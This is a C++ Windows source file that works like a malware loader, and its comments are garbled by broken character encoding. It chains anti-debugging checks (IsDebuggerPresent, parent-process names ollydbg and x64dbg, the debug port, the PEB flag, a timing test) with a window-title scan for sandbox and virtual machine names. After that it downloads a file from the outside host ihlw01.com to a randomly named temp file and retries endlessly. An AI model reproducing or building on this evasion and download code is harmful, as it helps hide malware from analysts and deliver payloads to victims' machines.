#include <iostream>
#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <cstdlib>
#include <ctime>
#include <tlhelp32.h>
#include <psapi.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "psapi.lib")

// �Զ��� NT_SUCCESS ��
#define NT_SUCCESS(Status) (((LONG)(Status)) >= 0)

// �ֶ����� _PEB �ṹ��
typedef struct _PEB {
    UCHAR InheritedAddressSpace;
    UCHAR ReadImageFileExecOptions;
    UCHAR BeingDebugged;
    UCHAR BitField;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    struct _PEB_LDR_DATA* Ldr;
    struct _RTL_USER_PROCESS_PARAMETERS* ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PRTL_CRITICAL_SECTION FastPebLock;
    PVOID AtlThunkSListPtr;
    PVOID IFEOKey;
    ULONG CrossProcessFlags;
    ULONG ProcessInJob;
    ULONG ProcessInSession;
    ULONG ImageFileExecutionOptions;
    ULONG ImageDataExecutionPreventionOptions;
    ULONG ImageDataExecutionPreventionPolicy;
    ULONG GdiSharedHandleTable;
    PVOID ProcessStarterHelper;
    ULONG GdiDCAttributeList;
    PVOID LoaderLock;
    ULONG OSMajorVersion;
    ULONG OSMinorVersion;
    USHORT OSBuildNumber;
    USHORT OSCSDVersion;
    ULONG OSPlatformId;
    ULONG ImageSubsystem;
    ULONG ImageSubsystemMajorVersion;
    ULONG ImageSubsystemMinorVersion;
    ULONG ImageProcessAffinityMask;
    ULONG GdiHandleBuffer[34];
    ULONG PostProcessInitRoutine;
    ULONG TlsExpansionCounter;
    PVOID TlsBitmap;
    ULONG TlsBitmapBits[2];
    ULONG ReadOnlySharedMemoryBase;
    PVOID ReadOnlySharedMemoryHeap;
    PVOID* ReadOnlyStaticServerData;
    PVOID AnsiCodePageData;
    PVOID OemCodePageData;
    PVOID UnicodeCaseTableData;
    ULONG NumberOfProcessors;
    ULONG NtGlobalFlag;
    LARGE_INTEGER CriticalSectionTimeout;
    ULONG HeapSegmentReserve;
    ULONG HeapSegmentCommit;
    ULONG HeapDeCommitTotalFreeThreshold;
    ULONG HeapDeCommitFreeBlockThreshold;
    ULONG NumberOfHeaps;
    ULONG MaximumNumberOfHeaps;
    PVOID* ProcessHeaps;
    PVOID GdiSharedHandleHeap;
    PVOID ProcessStarterHelperName;
    PVOID GdiCachedProcessHandle;
    ULONG GdiClientPID;
    ULONG GdiClientTID;
    PVOID GdiThreadLocalInfo;
    ULONG Win32ClientInfo[62];
    PVOID glDispatchTable[233];
    PVOID glReserved1[29];
    ULONG glReserved2;
    ULONG glSectionInfo;
    ULONG glSection;
    ULONG glTable;
    ULONG glCurrentRC;
    ULONG glContext;
    PVOID LastStatusValue;
    PVOID StaticUnicodeString;
    WCHAR StaticUnicodeBuffer[261];
    PVOID DeallocationStack;
    PVOID TlsSlots[64];
    ULONG TlsLinks;
    PVOID Vdm;
    PVOID ReservedForNtRpc;
    PVOID DbgTransportConnection;
    ULONG DbgHeapFlags;
    ULONG DbgPid;
    ULONG ReservedForRtl;
    ULONG AtlThunkSListPtr32;
    ULONG HeapCommitTotalFreeThreshold;
    ULONG HeapDeCommitFreeBlockSectionThreshold;
    ULONG NumberOfPagingFiles;
    ULONG PagingFilesInUse;
    ULONG PagingFilesReserved;
    ULONG PagingFilesCommitted;
    ULONG PagingFilesPeak;
    ULONG PagingFilesTotal;
    ULONG SessionId;
} PEB, * PPEB;

// ö�ٴ��ڻص����������ڼ�鴰�ڱ����Ƿ�����ؼ���
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    char windowTitle[256];
    if (GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle))) {
        const std::vector<std::string>* keywordList = reinterpret_cast<const std::vector<std::string>*>(lParam);
        for (std::vector<std::string>::const_iterator it = keywordList->begin(); it != keywordList->end(); ++it) {
            if (std::string(windowTitle).find(*it) != std::string::npos) {
                return FALSE;
            }
        }
    }
    return TRUE;
}

// ��װ�� __try ��ⲿ�ֵĴ���
void mainFunction() {
    // 1. ʹ�� IsDebuggerPresent ��������Ƿ��е���������
    if (IsDebuggerPresent()) {
        std::cerr << "Debugger detected by IsDebuggerPresent. Exiting..." << std::endl;
        return;
    }

    // 3. ��鸸�����Ƿ�Ϊ����������
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (pe32.th32ProcessID == GetCurrentProcessId()) {
                    HANDLE hParentProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ParentProcessID);
                    if (hParentProcess) {
                        wchar_t szProcessName[MAX_PATH];
                        if (GetModuleFileNameExW(hParentProcess, NULL, szProcessName, MAX_PATH)) {
                            std::wstring processName(szProcessName);
                            if (processName.find(L"ollydbg.exe") != std::wstring::npos ||
                                processName.find(L"x64dbg.exe") != std::wstring::npos) {
                                std::cerr << "Debugger detected by parent process check. Exiting..." << std::endl;
                                CloseHandle(hParentProcess);
                                CloseHandle(hSnapshot);
                                return;
                            }
                        }
                        CloseHandle(hParentProcess);
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }

    // 4. �����Զ˿�
    typedef NTSTATUS(WINAPI* NtQueryInformationProcessPtr)(
        HANDLE ProcessHandle,
        DWORD ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
        );
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll) {
        NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hNtdll, "NtQueryInformationProcess");
        if (NtQueryInformationProcess) {
            DWORD debugPort;
            NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL);
            if (NT_SUCCESS(status) && debugPort != 0) {
                std::cerr << "Debugger detected by debug port check. Exiting..." << std::endl;
                return;
            }
        }
    }

    // 5. �����̻����飨PEB���� BeingDebugged ��־
    typedef struct _PROCESS_BASIC_INFORMATION {
        PVOID Reserved1;
        PPEB PebBaseAddress;
        PVOID Reserved2[2];
        ULONG_PTR UniqueProcessId;
        PVOID Reserved3;
    } PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

    typedef NTSTATUS(WINAPI* NtQueryInformationProcessPtr2)(
        HANDLE ProcessHandle,
        DWORD ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
        );

    hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll) {
        NtQueryInformationProcessPtr2 NtQueryInformationProcess = (NtQueryInformationProcessPtr2)GetProcAddress(hNtdll, "NtQueryInformationProcess");
        if (NtQueryInformationProcess) {
            PROCESS_BASIC_INFORMATION pbi;
            NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(), 0, &pbi, sizeof(pbi), NULL);
            if (NT_SUCCESS(status)) {
                PPEB peb = pbi.PebBaseAddress;
                if (peb && peb->BeingDebugged) {
                    std::cerr << "Debugger detected by PEB flag check. Exiting..." << std::endl;
                    return;
                }
            }
        }
    }

    // 6. ͨ��ʱ��������������������ʹ����ִ�б�����
    const int LOOP_COUNT = 1000000;
    DWORD startTime = GetTickCount();
    for (int i = 0; i < LOOP_COUNT; ++i) {
        volatile int result = i * i;
    }
    DWORD endTime = GetTickCount();
    DWORD elapsedTime = endTime - startTime;
    if (elapsedTime > 100) {
        std::cerr << "Debugger detected by time difference check. Exiting..." << std::endl;
        return;
    }

    // ���ڼ�ⲿ��
    std::vector<std::string> keywords = { "sandbox", "virtualbox", "vmware" };
    bool isKeywordWindowRunning = !EnumWindows(EnumWindowsProc, reinterpret_cast<LPARAM>(&keywords));

    if (isKeywordWindowRunning) {
        std::cout << "Detected sandbox or keyword window. Starting download..." << std::endl;

        // ��������ļ���������·��
        static const wchar_t charset[] = L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        std::srand(static_cast<unsigned int>(std::time(NULL)));
        std::wstring randomFileName;
        for (int i = 0; i < 10; ++i) {
            randomFileName += charset[std::rand() % (sizeof(charset) / sizeof(charset[0]) - 1)];
        }
        randomFileName += L".tmp";
        wchar_t tempPath[MAX_PATH];
        if (GetTempPathW(MAX_PATH, tempPath) == 0) {
            std::cerr << "Failed to get temp path. Exiting..." << std::endl;
            return;
        }
        std::wstring filePath = std::wstring(tempPath) + randomFileName;

        std::wstring url = L"http://ihlw01.com/file.zip";
        HINTERNET hInternet = InternetOpenW(L"MyApp", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (!hInternet) {
            std::cerr << "InternetOpen failed. Retrying..." << std::endl;
            while (true) {
                hInternet = InternetOpenW(L"MyApp", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
                if (hInternet) break;
                Sleep(5000);
            }
        }

        while (true) {
            HINTERNET hUrl = InternetOpenUrlW(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
            if (!hUrl) {
                std::cerr << "InternetOpenUrl failed. Retrying in 5 seconds..." << std::endl;
                Sleep(5000);
                continue;
            }

            HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile == INVALID_HANDLE_VALUE) {
                std::cerr << "CreateFile failed. Retrying in 5 seconds..." << std::endl;
                InternetCloseHandle(hUrl);
                Sleep(5000);
                continue;
            }

            const int bufferSize = 4096;
            char buffer[bufferSize];
            DWORD bytesRead;
            DWORD bytesWritten;
            bool downloadSuccess = true;
            while (InternetReadFile(hUrl, buffer, bufferSize, &bytesRead) && bytesRead > 0) {
                if (!WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead) {
                    downloadSuccess = false;
                    break;
                }
            }

            CloseHandle(hFile);
            InternetCloseHandle(hUrl);

            if (downloadSuccess) {
                std::cout << "File downloaded successfully to: " << std::string(filePath.begin(), filePath.end()) << std::endl;
                break;
            }
            else {
                std::cerr << "Download failed. Retrying in 5 seconds..." << std::endl;
                Sleep(5000);
            }
        }
        InternetCloseHandle(hInternet);
    }
    else {
        std::cout << "No sandbox or keyword window detected. Continuing normal execution..." << std::endl;
        // �����������������Ҫִ�еĴ���
    }
}

